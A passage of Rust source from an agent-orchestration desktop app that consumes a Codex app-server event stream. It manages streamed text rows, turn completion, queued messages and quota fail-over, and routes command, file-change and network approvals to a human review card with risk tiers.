/// `turn/completed`'s embedded `turn.error.message`
/// (`codex_app_server::turn_error_text`), which otherwise doubles the bubble.
/// `ends_with` (not a whole-buffer `==`) so a repeat that follows OTHER
/// already-buffered text (e.g. a transient reconnect banner ahead of the real
/// failure) is still caught, not just a bare first-delta repeat. An
/// empty/whitespace-only `text` is never "duplicate" — it just has nothing to
/// dedupe against and should flow through as a harmless no-op append.
fn is_anonymous_slot_duplicate(buf: &str, text: &str) -> bool {
    let text = text.trim();
    !text.is_empty() && buf.trim_end().ends_with(text)
}

/// One long-lived task per codex session: consume the thread's app-server
/// stream, driving the SAME timeline-row / Push pipeline the stdout reader uses,
/// and flushing the queue on turn end. Mirrors [`spawn_reader`]'s event handling.
async fn codex_consumer(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    client: crate::codex_app_server::Client,
    thread: String,
    quota_command: String,
    mut rx: tokio::sync::mpsc::UnboundedReceiver<crate::codex_app_server::ThreadMsg>,
) {
    use super::proto::ChatEvent;
    use crate::codex_app_server::ThreadMsg;
    // server-request id → AskRegistry ask id, for the in-flight Needs-you cards
    // this session opened. Shared (lock-free) with the per-ask reply tasks so a
    // later serverRequest/resolved can cancel the right card. Cleared when answered.
    let pending_asks: Arc<crossbeam_skiplist::SkipMap<String, u64>> =
        Arc::new(crossbeam_skiplist::SkipMap::new());
    while let Some(msg) = rx.recv().await {
        let receipt_activity = match &msg {
            ThreadMsg::Event(event) => super::proto::is_agent_activity(event),
            ThreadMsg::Approval { .. } => true,
            ThreadMsg::QuotaExceeded | ThreadMsg::Heartbeat | ThreadMsg::AskResolved { .. } => {
                false
            }
        };
        match msg {
            ThreadMsg::QuotaExceeded => {
                let tool = {
                    let mut inner = eng.lock().await;
                    if inner.turn.busy {
                        inner.turn.quota_exceeded = true;
                        Some(inner.tool.clone())
                    } else {
                        None
                    }
                };
                if let Some(tool) = tool {
                    let previous = crate::engine_quota::current(&tool);
                    if let Some(snapshot) =
                        structured_codex_exhaustion_snapshot(&tool, previous.as_ref())
                    {
                        crate::engine_quota::report_for_command(snapshot, &quota_command);
                    }
                }
            }
            ThreadMsg::Event(ChatEvent::TextDelta {
                text,
                item,
                agent_thread,
            }) => {
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                let thread_id = inner.thread_id;
                let (sid, turn) = (inner.session_id, inner.turn_id);
                // Ensure the target row exists: item-keyed rows in `open_texts`
                // (parallel app-server streams), the anonymous slot in `current`
                // (errors / turn-failure texts / non-item dialect paths). A NEW
                // item-keyed row's origin (issue #99) is normalized ONCE here —
                // sticky for the row's whole life (OpenTextRow::agent_thread),
                // never re-derived from a later delta on the same item.
                let missing = match &item {
                    Some(k) => !inner.open_texts.contains_key(k),
                    None => inner.current.is_none(),
                };
                if missing {
                    let branch = branch_of(agent_thread, &thread);
                    let content = match &item {
                        Some(_) => text_row_content("", branch.as_deref()),
                        None => r#"{"text":""}"#.to_string(),
                    };
                    let Ok(m) = repo::insert_lead_message(
                        &db,
                        thread_id,
                        sid,
                        turn,
                        "assistant",
                        "text",
                        &content,
                        "streaming",
                    )
                    .await
                    else {
                        continue;
                    };
                    match &item {
                        Some(k) => {
                            inner.open_texts.insert(
                                k.clone(),
                                OpenTextRow {
                                    row: m.id,
                                    buf: String::new(),
                                    last_flush: std::time::Instant::now(),
                                    agent_thread: branch,
                                },
                            );
                        }
                        None => {
                            inner.current = Some((m.id, String::new(), std::time::Instant::now()))
                        }
                    }
                    let _ = app.emit(
                        EVENT,
                        Push::Message {
                            thread_id,
                            message: m,
                        },
                    );
                }
                // Read the in-flight turn's tag before borrowing the slot mutably.
                let origin_tag = inner.current_origin_tag.clone();
                let row = match &item {
                    Some(k) => {
                        let Some(c) = inner.open_texts.get_mut(k) else {
                            continue;
                        };
                        c.buf.push_str(&text);
                        let row = c.row;
                        if c.last_flush.elapsed().as_millis() >= STREAM_THROTTLE_MS {
                            c.last_flush = std::time::Instant::now();
                            let content = text_row_content(&c.buf, c.agent_thread.as_deref());
                            let _ =
                                repo::update_lead_message(&db, row, &content, "streaming").await;
                            emit_lead_delta(&app, thread_id, row, &c.buf, false, origin_tag);
                        }
                        row
                    }
                    None => {
                        let Some(c) = inner.current.as_mut() else {
                            continue;
                        };
                        // issue #97: codex app-server's ONLY `item:None` deltas are
                        // error surfacing — a top-level `error` notification, then
                        // possibly the SAME message again via `turn/completed`'s
                        // embedded `turn.error.message` (see
                        // `codex_app_server::turn_error_text`) — both land in this
                        // same anonymous slot. Absorb the repeat instead of
                        // doubling the bubble.
                        if is_anonymous_slot_duplicate(&c.1, &text) {
                            continue;
                        }
                        c.1.push_str(&text);
                        let row = c.0;
                        if c.2.elapsed().as_millis() >= STREAM_THROTTLE_MS {
                            c.2 = std::time::Instant::now();
                            let content = serde_json::json!({ "text": c.1 }).to_string();
                            let _ =
                                repo::update_lead_message(&db, row, &content, "streaming").await;
                            emit_lead_delta(&app, thread_id, row, &c.1, false, origin_tag);
                        }
                        row
                    }
                };
                let _ = app.emit(
                    EVENT,
                    Push::Delta {
                        thread_id,
                        message_id: row,
                        text,
                    },
                );
            }
            ThreadMsg::Event(ChatEvent::TextDone {
                item,
                text,
                agent_thread,
            }) => {
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                let streamed = item.as_ref().and_then(|k| inner.open_texts.remove(k));
                match streamed {
                    // The item streamed: finalize its row, preferring the
                    // authoritative full body over the accumulated frames. When
                    // that body differs (dropped/duped delta frames), the
                    // finalize push must carry it so the live view heals too.
                    // The row's origin was already decided at its FIRST delta
                    // (OpenTextRow::agent_thread) — this event's OWN agent_thread
                    // is redundant with it (same item, same thread) and unused.
                    Some(OpenTextRow {
                        row,
                        buf,
                        agent_thread: tag,
                        ..
                    }) => {
                        let auth = text.filter(|t| !t.is_empty());
                        let replaced = auth.as_deref().is_some_and(|t| t != buf);
                        let body = auth.unwrap_or(buf);
                        finalize_text_row(
                            &app,
                            &db,
                            &mut inner,
                            row,
                            body,
                            "complete",
                            replaced,
                            tag.as_deref(),
                        )
                        .await;
                    }
                    // No open row (content items never stream): land the text as
                    // a standalone completed row.
                    None => {
                        let Some(t) = text.filter(|t| !t.trim().is_empty()) else {
                            continue;
                        };
                        let thread_id = inner.thread_id;
                        let (sid, turn) = (inner.session_id, inner.turn_id);
                        let branch = branch_of(agent_thread, &thread);
                        let content = text_row_content("", branch.as_deref());
                        let Ok(m) = repo::insert_lead_message(
                            &db,
                            thread_id,
                            sid,
                            turn,
                            "assistant",
                            "text",
                            &content,
                            "streaming",
                        )
                        .await
                        else {
                            continue;
                        };
                        let _ = app.emit(
                            EVENT,
                            Push::Message {
                                thread_id,
                                message: m.clone(),
                            },
                        );
                        // Inserted empty + finalized at once: the push must carry
                        // the body or the live view shows an empty bubble.
                        // (finalize_text_row records turn_saw_text.)
                        finalize_text_row(
                            &app,
                            &db,
                            &mut inner,
                            m.id,
                            t,
                            "complete",
                            true,
                            branch.as_deref(),
                        )
                        .await;
                    }
                }
            }
            ThreadMsg::Event(ChatEvent::Assistant {
                texts,
                tools,
                agent_thread,
                ..
            }) => {
                // Codex streams text via deltas; non-text items are tool calls →
                // inline `kind:"tool"` rows, filled by their item.completed result.
                // Text rows are NOT finalized here: each agentMessage closes via
                // its own TextDone (item-keyed), so a tool item starting mid-flow
                // — routinely another collab agent's — no longer chops an
                // unrelated stream's sentence into fragment bubbles. Serial
                // ordering still holds: an item's completion precedes its tools.
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                if !texts.is_empty() {
                    finalize_current_text(&app, &db, &mut inner, "complete").await;
                }
                // Every tool this event carries is stamped with the SAME origin
                // (issue #99) — app-server only ever sends one per event, so this
                // is unambiguous; a sub-agent's own `read_file` call lands under
                // its branch instead of looking like unattributed mainline noise.
                let branch = branch_of(agent_thread, &thread);
                persist_tool_calls(&app, &db, &mut inner, tools, branch).await;
            }
            ThreadMsg::Event(ChatEvent::ToolResults { items }) => {
                let mut inner = eng.lock().await;
                if receipt_activity {
                    note_turn_activity(&app, &db, &eng, &mut inner);
                }
                merge_tool_results(&app, &db, &mut inner, items).await;
            }
            ThreadMsg::Event(ChatEvent::Usage {
                context_tokens,
                window,
            }) => {
                // app-server's current-context usage (last.inputTokens + window):
                // the accurate Context-panel value codex exec couldn't give.
                let mut inner = eng.lock().await;
                // `last` is the thread's LAST model call — while collab sub-agents
                // are in flight that flips between the main context and each
                // sub-agent's much smaller one, making the gauge jump (26% ⇄ 10%).
                // The payload carries no agent marker, so freeze the gauge for the
                // duration: running collab calls are exactly the open tool rows
                // named collabAgentToolCall (completed ones leave `tool_rows`).
                let collab_active = inner
                    .tool_rows
                    .values()
                    .any(|(_, v)| v["name"] == "collabAgentToolCall");
                if collab_active {
                    continue;
                }
                inner.last_context_tokens = Some(context_tokens);
                if window.is_some() {
                    inner.last_window = window;
                }
                let (thread_id, session_id) = (inner.thread_id, inner.session_id);
                let _ = app.emit(
                    EVENT,
                    Push::Usage {
                        thread_id,
                        session_id,
                        context_tokens,
                        window: inner.last_window,
                        model: inner.last_model.clone(),
                    },
                );
            }
            ThreadMsg::Event(ChatEvent::TurnEnd {
                is_error,
                context_tokens,
            }) => {
                // Rewind anchor for this turn (codex app-server: the turn id).
                // Grabbed BEFORE the lock section — and before the clear at the
                // bottom of this arm — so it names the turn that just ended.
                let finished_turn = client.active_turn(&thread).await;
                let mut inner = eng.lock().await;
                let thread_id = inner.thread_id;
                let session_id = inner.session_id;
                let structured_exceeded = inner.turn.quota_exceeded;
                if let Some(ct) = context_tokens {
                    inner.last_context_tokens = Some(ct);
                    let _ = app.emit(
                        EVENT,
                        Push::Usage {
                            thread_id,
                            session_id,
                            context_tokens: ct,
                            window: inner.last_window,
                            model: inner.last_model.clone(),
                        },
                    );
                }
                // Turn end is the natural checkpoint: last_* is at its freshest,
                // and one write per turn keeps the persistence cost trivial.
                persist_engine_meta(&db, &inner).await;
                let status = if inner.interrupting {
                    "interrupted"
                } else if is_error {
                    "error"
                } else {
                    "complete"
                };
                inner.interrupting = false;
                // A cleanly finished turn stamps its rewind anchor (the app-server
                // turn id) on the user row that opened it. Interrupted/error turns
                // write nothing — the previous completed turn's anchor stands.
                if status == "complete" {
                    if let (Some(row), Some(anchor)) = (inner.turn_user_row, finished_turn) {
                        if row > 0 {
                            let _ = repo::set_lead_message_anchor(&db, row, &anchor).await;
                        }
                    }
                }
                // An interrupted/failed turn can leave a tool row whose
                // item.completed never arrived; finalize it so it stops spinning.
                let orphans: Vec<(i32, serde_json::Value)> =
                    inner.tool_rows.drain().map(|(_, v)| v).collect();
                finalize_orphan_tool_rows(&app, &db, thread_id, orphans, status).await;
                // Item-keyed rows a lost item/completed left open (interrupt /
                // failed turn) finalize with the turn's status, same as tools.
                let had_item_rows = !inner.open_texts.is_empty();
                finalize_open_texts(&app, &db, &mut inner, status).await;
                if inner.current.is_some() {
                    // Finalize the open text row (forks <weft:*> sentinels out on a
                    // clean finish, closes its IM card) — same helper the tool
                    // boundary uses, so the final segment is handled identically.
                    finalize_current_text(&app, &db, &mut inner, status).await;
                } else if !had_item_rows && !inner.turn_saw_text {
                    if let Ok(Some(m)) = insert_terminal_assistant_if_missing(
                        &db,
                        thread_id,
                        inner.session_id,
                        inner.turn_id,
                        status,
                    )
                    .await
                    {
                        let _ = app.emit(
                            EVENT,
                            Push::Message {
                                thread_id,
                                message: m,
                            },
                        );
                    }
                }
                let next = inner.turn.on_turn_end();
                advance_dequeued_turn(&mut inner, &next);
                inner.last_assistant_uuid = None;
                inner.turn_saw_text = false;
                let next_turn_id = if next.is_some() {
                    inner.turn_id += 1;
                    Some(inner.turn_id)
                } else {
                    None
                };
                // Captured at dequeue, under this lock: if the flush below falls
                // back to exec after a stop-then-restart, `stopped` is clear again
                // but the epoch has advanced — the canceled message must not launch.
                let dequeue_epoch = inner.reset_epoch;
                let still_busy = inner.turn.busy;
                persist_activity(
                    &db,
                    inner.session_id,
                    thread_id,
                    if still_busy { "running" } else { "idle" },
                )
                .await;
                inner.clock.on_turn_end(still_busy);
                let _ = app.emit(
                    EVENT,
                    Push::Turn {
                        thread_id,
                        session_id: inner.session_id,
                        state: if still_busy { "busy" } else { "idle" }.into(),
                        queue: queue_items(&inner.turn),
                    },
                );
                let tool_for_quota_check = inner.tool.clone();
                drop(inner);
                // issue #97: a turn that just failed while the engine_quota hub's
                // last-observed reading for this tool says Exceeded is a
                // candidate for an auto fail-over — decoupled (own task, see
                // `spawn_quota_failover_check`) so it can safely re-lock `eng`
                // without deadlocking THIS task.
                if should_attempt_quota_failover(status, structured_exceeded, still_busy) {
                    crate::lead_chat::commands::spawn_quota_failover_check(
                        app.clone(),
                        db.clone(),
                        thread_id,
                        session_id,
                        tool_for_quota_check,
                        structured_exceeded,
                    );
                }
                // This turn is over: drop its active-turn id so a subsequent
                // interrupt won't target a finished turn (the flush below re-sets
                // it for the next turn).
                client.clear_active_turn(&thread).await;
                // Flush: start the next queued message as a fresh turn on this thread.
                // Gated on the dequeue-time epoch: a stop — or stop-then-restart,
                // which clears `stopped` but bumps the epoch — since the pop must
                // not deliver the canceled message on the app-server path either
                // (the exec fallback below already checks it). The TOCTOU after
                // this check is bounded: stop shuts the client down, failing
                // pending requests and closing this consumer.
                let flush_stop_won = {
                    let g = eng.lock().await;
                    g.stopped || g.reset_epoch != dequeue_epoch
                };
                if flush_stop_won {
                    // Ownership-guarded (turn_id + busy): no-ops when the stop
                    // already reset the turn itself.
                    if let Some(turn_id) = next_turn_id {
                        rollback_failed_turn(&app, &db, &eng, turn_id, "interrupted").await;
                    }
                    // The popped message is no longer in the in-memory queue, so
                    // the rollback's drained sweep can't see its row — finalize it
                    // explicitly or it stays `queued` forever.
                    if let Some(n) = next.as_ref() {
                        finalize_dequeued_row(&app, &db, thread_id, n, "interrupted").await;
                    }
                } else if let (Some(n), Some(turn_id)) = (next, next_turn_id) {
                    // Pre-turn checkpoint for the dequeued turn (its user row is
                    // the queued row's id), awaited before turn/start dispatches
                    // the message to the agent.
                    if let Some(qid) = n.queue_id {
                        snapshot_turn_checkpoint(&app, &db, session_id, turn_id, qid).await;
                    }
                    match client
                        .start_turn_with_images(&thread, &n.text, &n.local_image_paths)
                        .await
                    {
                        Ok(t) => {
                            mark_queued_delivered(&app, &db, thread_id, session_id, &n).await;
                            client.set_active_turn(&thread, &t).await;
                            // Stop pressed during this flush's start_turn? interrupt()
                            // had no active turn id to act on (same window as a direct
                            // send) — honor it now that the turn is recorded.
                            if eng.lock().await.interrupting {
                                let _ = client.interrupt(&thread, &t).await;
                            }
                        }
                        // App-server died/rejecting between turns: don't drop the
                        // queued message — fall back to the same exec path a direct
                        // send uses (native id is shared, so resume is seamless).
                        Err(e) => {
                            // A Stop during the failed start: roll the queued turn back
                            // interrupted instead of resurrecting it on exec.
                            if eng.lock().await.interrupting {
                                rollback_failed_turn(&app, &db, &eng, turn_id, "interrupted").await;
                                finalize_dequeued_row(&app, &db, thread_id, &n, "interrupted")
                                    .await;
                            } else {
                                eprintln!(
                                    "[weft][codex] flush via app-server failed ({e}); trying exec"
                                );
                                // Take + shut down the (closing) client first — same as
                                // the direct-send fallback — so THIS consumer sees it's
                                // superseded (ptr_eq) and skips cleanup, instead of
                                // racing spawn_turn and resetting the exec turn. The
                                // bearer dies with it; `spawn_turn` re-mints for exec.
                                let stale = {
                                    let mut inner = eng.lock().await;
                                    let c = inner.codex_client.take();
                                    if c.is_some() {
                                        revoke_engine_bearer(&mut inner);
                                    }
                                    c
                                };
                                if let Some(c) = stale {
                                    c.shutdown().await;
                                }
                                match spawn_turn(
                                    app.clone(),
                                    db.clone(),
                                    eng.clone(),
                                    n.clone(),
                                    Some(dequeue_epoch),
                                )
                                .await
                                {
                                    Ok(()) => {
                                        mark_queued_delivered(&app, &db, thread_id, session_id, &n)
                                            .await;
                                    }
                                    Err(e2) => {
                                        eprintln!("[weft][codex] exec fallback for queued turn failed: {e2}");
                                        // The guard inside spawn_turn may have canceled
                                        // (stop/interrupt/epoch) rather than failed.
                                        let status =
                                            drain_failure_status(&eng, dequeue_epoch).await;
                                        rollback_failed_turn(&app, &db, &eng, turn_id, status)
                                            .await;
                                        finalize_dequeued_row(&app, &db, thread_id, &n, status)
                                            .await;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            ThreadMsg::Event(_) => {}
            ThreadMsg::Heartbeat => {
                // Heartbeats are transport liveness metadata, not evidence that
                // the agent consumed the current prompt.
            }
            ThreadMsg::Approval { id, method, params } => {
                // An approval (command / file-change / permissions) — route to Weft's
                // Ask Bridge (the same Needs-you the exec path uses), then reply with
                // the SHAPE that kind wants: permissions `{permissions}` (omitted =
                // denied), everything else `{decision}`. Elicitation / other server
                // asks never reach here — they're declined in the read_loop.
                let is_perm = method.contains("permissions");
                let (thread_id, dir) = {
                    let mut i = eng.lock().await;
                    // An approval request IS the agent actively working on
                    // this turn — it just needs a human before it can go
                    // further. Without this, a turn whose FIRST event is an
                    // approval (no preceding text/tool-call delta) would
                    // leave the receipt stuck at "delivered" while the user
                    // stares at a Needs-you card that proves otherwise (PR
                    // #117 review, P2).
                    if receipt_activity {
                        note_turn_activity(&app, &db, &eng, &mut i);
                    }
                    (i.thread_id, i.ask_dir.clone())
                };
                // Requested permission profile (also echoed back as the grant on allow).
                let requested = params
                    .get("permissions")
                    .or_else(|| params["item"].get("permissions"))
                    .or_else(|| params["params"].get("permissions"))
                    .filter(|v| !v.is_null())
                    .cloned();
                // `summary` is a compact DISPLAY label (may truncate — a >3-path
                // edit, a 120-char permission scope); `detail` is the FULL raw
                // content (untruncated, shown in the detail tooltip / IM
                // plain-text card); `risk` is the danger tier for the human's
                // one-glance triage, computed by the single shared
                // `crate::ask::classify_risk` (issue #101); `action_key` is the
                // EXACT action identity used ONLY for Always-grant matching
                // (never displayed) — see #89. Mirrors `bus::server::summarize`'s
                // claude/opencode shape so both engines share the same canonical
                // action-key (and risk) semantics.
                let (tool, summary, detail, risk, action_key) =
                    codex_approval_fields(&method, &params);
                let registry = app.state::<crate::ask::AskRegistry>().inner().clone();
                // `risk` gates issue #103's read-only batch/issue grants inside
                // auto_decision; it never widens Full/Always, which ignore it.
                match registry.auto_decision(thread_id, &dir, risk, &action_key) {
                    // dangerous mode / full access / always-allow: reply inline (fast).
                    Some(d) => {
                        let allow = matches!(d, crate::ask::Decision::Allow);
                        let _ = client
                            .reply_result(
                                &id,
                                crate::codex_app_server::codex_approval_reply(
                                    is_perm, allow, requested,
                                ),
                            )
                            .await;
                    }
                    // Needs a human answer: await it in a SIDE TASK so the consumer
                    // loop keeps draining (TurnEnd / interrupt / cleanup) while the
                    // Needs-you is open — else a Stop can't be processed until the
                    // stale card is answered. A late reply to an already-resolved turn
                    // is harmless (codex ignores it).
                    None => {
                        let (aid, rx) = registry.request(
                            thread_id,
                            &dir,
                            tool,
                            &summary,
                            &detail,
                            risk,
                            &action_key,
                        );
                        // Remember this card by server-request id so a later
                        // serverRequest/resolved can cancel it; clear on answer.
                        let key = id.to_string();
                        pending_asks.insert(key.clone(), aid);
                        let client = client.clone();
                        let pending = pending_asks.clone();
                        tauri::async_runtime::spawn(async move {
                            let allow = matches!(
                                rx.await.unwrap_or(crate::ask::Decision::Deny),
                                crate::ask::Decision::Allow
                            );
                            pending.remove(&key);
                            let _ = client
                                .reply_result(
                                    &id,
                                    crate::codex_app_server::codex_approval_reply(
                                        is_perm, allow, requested,
                                    ),
                                )
                                .await;
                        });
                    }
                }
            }
            ThreadMsg::AskResolved { request_id } => {
                // The server cleared this ask (interrupt / otherwise): cancel the
                // matching Needs-you card so it doesn't linger and send a stale
                // reply when clicked. The reply task's rx then errors → it declines.
                if let Some(entry) = pending_asks.remove(&request_id.to_string()) {
                    app.state::<crate::ask::AskRegistry>()
                        .inner()
                        .cancel(*entry.value());
                }
            }
        }
    }
    // Only a GENUINE disconnect runs the turn cleanup. If the engine's client was
    // taken/replaced (the exec-fallback teardown shut us down on purpose), skip it
    // — else this cleanup races spawn_turn and can kill/stop the fallback turn.
    let still_active = {
        let mut inner = eng.lock().await;
        let ours = matches!(&inner.codex_client, Some(c) if c.ptr_eq(&client));
        if ours {
            // The app-server this consumer was attached to is gone: kill its
            // bearer under the SAME lock that proved the client is still ours,
            // so a replacement connected in between can't have its live one
            // revoked instead. `ptr_eq` plays the role `generation` plays for
            // `spawn_reader`'s EOF.
            //
            // Not left to `cleanup_disconnected_turn` below, even though that
            // revokes too: it early-returns on an idle engine, which is exactly
            // an app-server that died between turns. See `revoke_engine_bearer`.
            revoke_engine_bearer(&mut inner);
        }
        ours
    };
    if still_active {
        cleanup_disconnected_turn(&app, &db, &eng, "error").await;
    }
}

/// The (tool, summary, detail, risk, action_key) quintuple for a codex
/// app-server approval — computed ONCE so the Needs-you card, the IM card,
/// and Always matching all agree. `summary` is a compact DISPLAY label that
/// may truncate (a >3-path edit, a 120-char permission scope); `detail` is
/// the FULL raw content (untruncated); `risk` is the danger tier for the
/// human's one-glance triage, computed by the single shared
/// `crate::ask::classify_risk` (issue #101); `action_key` is the EXACT action
/// identity used ONLY for Always-grant matching (never displayed). Mirrors
/// `bus::server::summarize`'s claude/opencode shape so both engines share the
/// same canonical semantics — see issue #89.
// `pub(crate)` (not `pub`) — crate-internal only, but visible to this
// module's own test suite for the cross-engine consistency regression test
// (issue #101 round-2 P3), which also calls `bus::server::summarize`.
pub(crate) fn codex_approval_fields(
    method: &str,
    params: &serde_json::Value,
) -> (&'static str, String, String, crate::ask::RiskLevel, String) {
    // command/cwd may sit at the top level (commandExecution ask) or nested
    // under `item` (the generic permissions ask) — read both.
    let cmd = params["command"]
        .as_str()
        .or_else(|| params["item"]["command"].as_str());
    let is_cmd = method.contains("commandExecution") || cmd.is_some();
    let net = params
        .get("networkApprovalContext")
        .or_else(|| params["item"].get("networkApprovalContext"))
        .filter(|v| !v.is_null());
    let has_changes = params["changes"]
        .as_array()
        .or_else(|| params["item"]["changes"].as_array())
        .is_some_and(|c| !c.is_empty());

    // Network FIRST: a network-only ask arrives as a commandExecution approval
    // (so is_cmd is true) with the command omitted, so the cmd branch would
    // otherwise mislabel + Always-key it as Bash.
    if let Some(net) = net {
        let host = net["host"]
            .as_str()
            .or_else(|| net["url"].as_str())
            .or_else(|| net["domain"].as_str())
            .unwrap_or("network");
        let action_key = crate::ask::action_key(&["Network", host]);
        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Network);
        return (
            "Network",
            format!("network access: {host}"),
            host.to_string(),
            risk,
            action_key,
        );
    }
    if is_cmd {
        let full = cmd.unwrap_or("(command)").to_string();
        let first = full.lines().next().unwrap_or("").to_string();
        // action_key = the full, untruncated command — a later line or arg
        // change is a different action even if the first line (and thus
        // `summary`) matches. Routed through the SAME collision-resistant
        // encoding as bus::server::summarize (crate::ask::action_key) — a bare
        // `format!("Bash:{full}")` join is a fixed-literal-prefixed string, so
        // it's safe here in isolation, but using one canonical helper for every
        // engine's action_key removes any need to re-litigate that argument
        // per call site (see #89's round-2 finding on the claude/opencode side).
        let action_key = crate::ask::action_key(&["Bash", &full]);
        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Command(&full));
        return (
            "Bash",
            format!("Run: {first}"),
            full.clone(),
            risk,
            action_key,
        );
    }
    if has_changes {
        // `full_paths` is the UNTRUNCATED changed-path list: the AskRegistry
        // keys Always rules by action_key, so a >3-path edit whose display
        // summary caps at "first 3 + N" must still disambiguate from a
        // DIFFERENT >3-path edit sharing that same capped label. Routed
        // through the SAME File classifier as bus::server::summarize's
        // file_path branch — "Edit" is a recognized write verb, and a
        // credential-shaped path among the changes (e.g. `.env`) still wins.
        let (summary, full_paths) = codex_change_approval_summary(params);
        let action_key = crate::ask::action_key(&["Edit", &full_paths]);
        let risk = crate::ask::classify_risk(crate::ask::RiskSignal::File {
            tool_name: "Edit",
            path: &full_paths,
        });
        return ("Edit", summary, full_paths, risk, action_key);
    }
    // A permission escalation — key it by the REQUESTED scope, else an Always
    // for one profile silently grants a later, different one. `risk` scans
    // the scope text like any other MCP/fallback call; a scope that doesn't
    // spell out "network"/a credential marker honestly lands on Unknown
    // rather than guessing — a permission ESCALATION is inherently the kind
    // of ask that deserves a closer look, not a reassuring green badge.
    let requested = params
        .get("permissions")
        .or_else(|| params["item"].get("permissions"))
        .or_else(|| params["params"].get("permissions"))
        .filter(|v| !v.is_null());
    let scope_json = requested
        .map(|v| v.to_string())
        .unwrap_or_else(|| "(unspecified)".to_string());
    let scope_label: String = scope_json.chars().take(120).collect();
    let action_key = crate::ask::action_key(&["Permission", &scope_json]);
    let risk = crate::ask::classify_risk(crate::ask::RiskSignal::Other {
        tool_name: "Permission",
        args_text: &scope_json,
    });
    (
        "Permission",
        format!("permission: {scope_label}"),
        scope_json,
        risk,
        action_key,
    )
}

/// Specific Needs-you summary for an app-server file-change approval: a compact
/// DISPLAY label capped at 3 paths (`take(3) + "+N"`), plus the FULL
/// (untruncated) changed-path list (top-level or nested under `item`) for the
/// detail panel / action key — so a >3-path edit still gets its own exact
/// Always-rule key instead of colliding with a different >3-path edit that
/// happens to share its first 3 paths + count (issue #89).
fn codex_change_approval_summary(params: &serde_json::Value) -> (String, String) {
    let changes = params["changes"]
        .as_array()
        .or_else(|| params["item"]["changes"].as_array());
    let paths: Vec<&str> = changes
        .map(|cs| cs.iter().filter_map(|c| c["path"].as_str()).collect())
        .unwrap_or_default();
    if paths.is_empty() {
        return ("apply file changes".to_string(), String::new());
    }
    let mut summary = format!(
        "apply file changes: {}",
        paths.iter().take(3).cloned().collect::<Vec<_>>().join(", ")
    );
    let more = paths.len().saturating_sub(3);
    if more > 0 {
        summary.push_str(&format!(" +{more}"));
    }
    // JSON-array encoding: unambiguous (each path quoted/escaped) even if a
    // path itself contains ", ".
    let full = serde_json::to_string(&paths).unwrap_or_default();
    (summary, full)
}

/// One per-turn process (codex/opencode): the message rides the argv, events
/// stream from stdout, EOF ends the turn (the reader then flushes the queue).
async fn spawn_turn(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    out: Outgoing,
    expected_epoch: Option<u64>,
) -> anyhow::Result<()> {
    let mut inner = eng.lock().await;
    // Atomic with the child snapshot below: never launch a per-turn process for a
    // stopped engine — a stop that raced into the send's Phase-3-to-spawn window,
    // or a queued turn drained just as the human stopped. Send-originated spawns
    // also pass their reservation's reset_epoch: a stop-THEN-RESTART clears
    // `stopped` again, but bumps the epoch, so the canceled send still can't
    // launch a child onto the restarted engine. `interrupting` is checked too:
    // an interrupt landing in this window has no child to kill — it only sets
    // the flag — and spawning anyway would run the very turn the user canceled.
    // Every caller already rolls back or propagates a spawn error, so returning
    // here is safe.
    if inner.stopped || inner.interrupting || expected_epoch.is_some_and(|e| e != inner.reset_epoch)
    {
        return Err(anyhow::anyhow!("engine stopped; not spawning a turn"));
    }
    // Per-turn argv (incl. codex's message-on-argv and opencode's /cmd→--command
    // peel) is built by the tool's adapter; `prepare` does the folder-trust
    // pre-accept. Identical output to the former inline match.
    let adapter = crate::adapters::adapter_for(&inner.tool)
        .ok_or_else(|| anyhow::anyhow!("unknown per-turn lead tool {}", inner.tool))?;
    adapter.prepare(&inner.cwd);
    // Re-mint the computer bearer before this turn's child — a per-turn tool
    // spawns from the engine's stored injection just like the resident path,
    // so a Stop-revoked bearer would otherwise ride into the new process
    refresh_computer_injection(&app, &mut inner);
    // The computer injection is appended here rather than living in
    // `extra_args`, mirroring `build_args` — see `EngineInner::computer_args`.
    let mut adapter_extra = inner.extra_args.clone();
    adapter_extra.extend(inner.computer_args.iter().cloned());
    let built = adapter.build_argv(&crate::adapters::AdapterContext {
        cwd: &inner.cwd,
        system_prompt: &inner.system_prompt,
        extra_args: &adapter_extra,
        native_id: inner.native_id.as_deref(),
        message: &out.text,
        slash_commands: &inner.slash_commands,
    });
    let (_program, args) = revoke_if_spawn_failed(&mut inner, built)?;
    // The adapter's program is the tool identity; resolve it through the
    // per-session pin / global override map so an aliased binary is spawned.
    let program = crate::tool_command::effective(inner.command.as_deref(), &inner.tool);
    let owner = match inner.session_id {
        Some(s) => crate::proc_registry::Owner::session(s.to_string()),
        None => crate::proc_registry::Owner::lead_thread(inner.thread_id.to_string()),
    };
    let mut command = Command::new(&program);
    command
        .args(&args)
        .current_dir(&inner.cwd)
        .env("PATH", crate::detect::tool_path())
        // injection-supplied env (the codex computer
        // bearer travels here, never argv — see `EngineInner::extra_env`).
        // `spawn_env` (not `extra_env` directly) — it appends the
        // computer injection and deep-merges the shared
        // OPENCODE_CONFIG_CONTENT key; see its own doc.
        .envs(spawn_env(&inner).iter().map(|(k, v)| (k.clone(), v.clone())))
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        // stderr → app log: a per-turn CLI that dies prints its reason there.
        .stderr(std::process::Stdio::inherit())
        .kill_on_drop(true);
    // 活跃会话软上限:拿一个会话槽,已满则排队(与 admit_new_work 硬闸互补)。
    let session_permit = crate::session_gate::acquire_session_slot().await;
    // T1: own process group + marker before spawn, register PAIRED with the child.
    let configured = crate::proc_registry::configure(&mut command, owner);
    let spawned = command.spawn();
    let mut child = revoke_if_spawn_failed(&mut inner, spawned)?;
    let reg = configured.register(&child);
    let piped = child
        .stdout
        .take()
        .ok_or_else(|| anyhow::anyhow!("child stdout not piped"));
    let stdout = revoke_if_spawn_failed(&mut inner, piped)?;
    inner.stdin = None;
    inner.child = Some(child);
    inner.child_reg = Some(reg);
    // permit 与 child_reg 同寿:per-turn 进程结束(下一轮 overwrite / stop)时 drop=释放槽。
    inner.child_permit = session_permit;
    inner.generation += 1;
    inner.current = None;
